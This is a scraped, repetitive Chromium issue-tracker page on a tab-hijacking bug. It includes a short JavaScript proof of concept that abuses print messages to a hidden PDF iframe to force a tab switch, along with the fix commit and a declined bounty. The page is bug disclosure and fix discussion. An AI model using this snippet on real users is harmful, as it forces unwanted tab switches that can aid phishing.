        Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.<span class="line"><!---->Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.<!----></span><br><br>For more details visit <span class="line"><!---->For more details visit <!----></span>https://www.chromium.org/issue-tracking/autotriage<a class="undefined" target="_blank" href="https://www.chromium.org/issue-tracking/autotriage"><!---->https://www.chromium.org/issue-tracking/autotriage<!----></a> - Your friendly Sheriffbot<span class="line"><!----> - Your friendly Sheriffbot<!----></span><mr-comment-content></mr-comment-content>

        The following revision refers to this bug:<span class="line"><!---->The following revision refers to this bug:<!----></span><br>  <span class="line"><!---->  <!----></span>https://chromium.googlesource.com/chromium/src/+/394f108457026153e48cd364ab8df4251513635b<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromium/src/+/394f108457026153e48cd364ab8df4251513635b"><!---->https://chromium.googlesource.com/chromium/src/+/394f108457026153e48cd364ab8df4251513635b<!----></a><br><br>commit <span class="line"><!---->commit <!----></span>394f108457026153e48cd364ab8df4251513635b<a class="undefined" target="_blank" href="https://crrev.com/394f108457026153e48cd364ab8df4251513635b"><!---->394f108457026153e48cd364ab8df4251513635b<!----></a><br>Author: Lei Zhang <<span class="line"><!---->Author: Lei Zhang &lt;<!----></span>thestig@chromium.org<a class="undefined" target="_blank" href="/u/thestig@chromium.org"><!---->thestig@chromium.org<!----></a>><span class="line"><!---->&gt;<!----></span><br>Date: Thu Feb 02 18:00:53 2023<span class="line"><!---->Date: Thu Feb 02 18:00:53 2023<!----></span><br><br>Print Preview: Avoid activating the tab when printing.<span class="line"><!---->Print Preview: Avoid activating the tab when printing.<!----></span><br><br>Since renderers can trigger printing, this can lead to unexpected tab<span class="line"><!---->Since renderers can trigger printing, this can lead to unexpected tab<!----></span><br>switching. This is vestigial behavior from an early Print Preview<span class="line"><!---->switching. This is vestigial behavior from an early Print Preview<!----></span><br>implementation that opened the preview in a new tab.<span class="line"><!---->implementation that opened the preview in a new tab.<!----></span><br><br>Bug: 1307087<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1307087" title="Tab hijacking on COOP protected websites."><!---->Bug:         Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction.     <mr-issue-details class="main-item"><!---->
      <style>
        mr-issue-details {
          font-size: var(--chops-main-font-size);
          background-color: var(--chops-white);
          padding-bottom: 1em;
          display: flex;
          align-items: stretch;
          justify-content: flex-start;
          flex-direction: column;
          margin: 0;
          box-sizing: border-box;
        }
        h3 {
          margin-top: 1em;
        }
        mr-description {
          margin-bottom: 1em;
        }
        mr-edit-issue {
          margin-top: 40px;
        }
      </style>

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>

        <span class="screenreader-hidden" aria-live="polite">

        </table>
      </div>

      <style>

          --mr-toggled-font-family: Monospace;

          width: 100%;

        }

          width: 100%;

          flex-direction: row;
          flex-wrap: no-wrap;

  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;

    text-decoration: underline;
  }

    /* Links that look like buttons. */

    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>


          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36<!----></span><br><br>Steps to reproduce the problem:<span class="line"><!---->Steps to reproduce the problem:<!----></span><br>On the attacker origin do the following (no user interaction used):<span class="line"><!---->On the attacker origin do the following (no user interaction used):<!----></span><br><br>let f = document.createElement('iframe');<span class="line"><!---->let f = document.createElement('iframe');<!----></span><br>f.hidden = true;<span class="line"><!---->f.hidden = true;<!----></span><br>f.src = '<span class="line"><!---->f.src = '<!----></span>https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<a class="undefined" target="_blank" href="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';"><!---->https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<!----></a><br>document.body.appendChild(f);<span class="line"><!---->document.body.appendChild(f);<!----></span><br>setTimeout(_ => {<span class="line"><!---->setTimeout(_ =&gt; {<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>setTimeout(location.reload(), 100);<span class="line"><!---->setTimeout(location.reload(), 100);<!----></span><br>}, 100);<span class="line"><!---->}, 100);<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>For the tab not to change without user interaction.<span class="line"><!---->For the tab not to change without user interaction.<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Forced user to switched to the attackers tab.<span class="line"><!---->Forced user to switched to the attackers tab.<!----></span><br><br>This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<span class="line"><!---->This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<!----></span><br>But if an attacker can just change the tab to theirs it might not work that well.<span class="line"><!---->But if an attacker can just change the tab to theirs it might not work that well.<!----></span><br><br>Also tab under!<span class="line"><!---->Also tab under!<!----></span><br><br>Did this work before? N/A <span class="line"><!---->Did this work before? N/A <!----></span><br><br>Chrome version: 99.0.4844.74  Channel: stable<span class="line"><!---->Chrome version: 99.0.4844.74  Channel: stable<!----></span><br>OS Version: 10.0<span class="line"><!---->OS Version: 10.0<!----></span><mr-comment-content></mr-comment-content>

        Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.<span class="line"><!---->Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.<!----></span><br><br>For more details visit <span class="line"><!---->For more details visit <!----></span>https://www.chromium.org/issue-tracking/autotriage<a class="undefined" target="_blank" href="https://www.chromium.org/issue-tracking/autotriage"><!---->https://www.chromium.org/issue-tracking/autotriage<!----></a> - Your friendly Sheriffbot<span class="line"><!----> - Your friendly Sheriffbot<!----></span><mr-comment-content></mr-comment-content>

        The following revision refers to this bug:<span class="line"><!---->The following revision refers to this bug:<!----></span><br>  <span class="line"><!---->  <!----></span>https://chromium.googlesource.com/chromium/src/+/394f108457026153e48cd364ab8df4251513635b<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromium/src/+/394f108457026153e48cd364ab8df4251513635b"><!---->https://chromium.googlesource.com/chromium/src/+/394f108457026153e48cd364ab8df4251513635b<!----></a><br><br>commit <span class="line"><!---->commit <!----></span>394f108457026153e48cd364ab8df4251513635b<a class="undefined" target="_blank" href="https://crrev.com/394f108457026153e48cd364ab8df4251513635b"><!---->394f108457026153e48cd364ab8df4251513635b<!----></a><br>Author: Lei Zhang <<span class="line"><!---->Author: Lei Zhang &lt;<!----></span>thestig@chromium.org<a class="undefined" target="_blank" href="/u/thestig@chromium.org"><!---->thestig@chromium.org<!----></a>><span class="line"><!---->&gt;<!----></span><br>Date: Thu Feb 02 18:00:53 2023<span class="line"><!---->Date: Thu Feb 02 18:00:53 2023<!----></span><br><br>Print Preview: Avoid activating the tab when printing.<span class="line"><!---->Print Preview: Avoid activating the tab when printing.<!----></span><br><br>Since renderers can trigger printing, this can lead to unexpected tab<span class="line"><!---->Since renderers can trigger printing, this can lead to unexpected tab<!----></span><br>switching. This is vestigial behavior from an early Print Preview<span class="line"><!---->switching. This is vestigial behavior from an early Print Preview<!----></span><br>implementation that opened the preview in a new tab.<span class="line"><!---->implementation that opened the preview in a new tab.<!----></span><br><br>Bug: 1307087<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1307087" title="Tab hijacking on COOP protected websites."><!---->Bug:         Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<span class="line"><!---->Hello, thank you for the report. Based on this report, however, this does not appear to be any user harm that can be introduced by this issue and what type of exploitation scenario this sort of issue would be useful in. This appears to be more of a functional issue rather than a security one. As such, we unfortunately must decline a VRP reward for this report.<!----></span><mr-comment-content></mr-comment-content>

        Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <span class="line"><!---->Tab nabbing is an attack that can be used to harm users which COOP could have prevented this was used as motivation for adding the security feature <!----></span>https://chromestatus.com/feature/5432089535053824<a class="undefined" target="_blank" href="https://chromestatus.com/feature/5432089535053824"><!---->https://chromestatus.com/feature/5432089535053824<!----></a> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<span class="line"><!----> "1) Cross-window attacks.  For example, a malicious document may open a victim document in a new window and later navigate the window to a look-alike document to trick the user."<!----></span><br><br>It also helps other security issues need more user interaction. (even a popunder can be exploited in timing attacks)<span class="line"><!---->It also helps other security issues need more user interaction.     <mr-issue-details class="main-item"><!---->
      <style>
        mr-issue-details {
          font-size: var(--chops-main-font-size);
          background-color: var(--chops-white);
          padding-bottom: 1em;
          display: flex;
          align-items: stretch;
          justify-content: flex-start;
          flex-direction: column;
          margin: 0;
          box-sizing: border-box;
        }
        h3 {
          margin-top: 1em;
        }
        mr-description {
          margin-bottom: 1em;
        }
        mr-edit-issue {
          margin-top: 40px;
        }
      </style>

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>

        <span class="screenreader-hidden" aria-live="polite">

        </table>
      </div>

      <style>

          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);

          min-width: 256px;

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

          <chops-button>
            Got it
          </chops-button>

x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36<!----></span><br><br>Steps to reproduce the problem:<span class="line"><!---->Steps to reproduce the problem:<!----></span><br>On the attacker origin do the following (no user interaction used):<span class="line"><!---->On the attacker origin do the following (no user interaction used):<!----></span><br><br>let f = document.createElement('iframe');<span class="line"><!---->let f = document.createElement('iframe');<!----></span><br>f.hidden = true;<span class="line"><!---->f.hidden = true;<!----></span><br>f.src = '<span class="line"><!---->f.src = '<!----></span>https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<a class="undefined" target="_blank" href="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';"><!---->https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';<!----></a><br>document.body.appendChild(f);<span class="line"><!---->document.body.appendChild(f);<!----></span><br>setTimeout(_ => {<span class="line"><!---->setTimeout(_ =&gt; {<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>f.contentWindow[0].postMessage({type: 'print'}, '*');<span class="line"><!---->f.contentWindow[0].postMessage({type: 'print'}, '*');<!----></span><br>setTimeout(location.reload(), 100);<span class="line"><!---->setTimeout(location.reload(), 100);<!----></span><br>}, 100);<span class="line"><!---->}, 100);<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>For the tab not to change without user interaction.<span class="line"><!---->For the tab not to change without user interaction.<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Forced user to switched to the attackers tab.<span class="line"><!---->Forced user to switched to the attackers tab.<!----></span><br><br>This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<span class="line"><!---->This seems to violate part of the Cross-Origin-Opener-Policy as one of its uses is to prevent cross-origin navigation's<!----></span><br>But if an attacker can just change the tab to theirs it might not work that well.<span class="line"><!---->But if an attacker can just change the tab to theirs it might not work that well.<!----></span><br><br>Also tab under!<span class="line"><!---->Also tab under!<!----></span><br><br>Did this work before? N/A <span class="line"><!---->Did this work before? N/A <!----></span><br><br>Chrome version: 99.0.4844.74  Channel: stable<span class="line"><!---->Chrome version: 99.0.4844.74  Channel: stable<!----></span><br>OS Version: 10.0<span class="line"><!---->OS Version: 10.0<!----></span><mr-comment-content></mr-comment-content>

This is vestigial behavior from an early Print Preview<span class="line"><!---->switching.           <strong><!---->Labels:</strong>

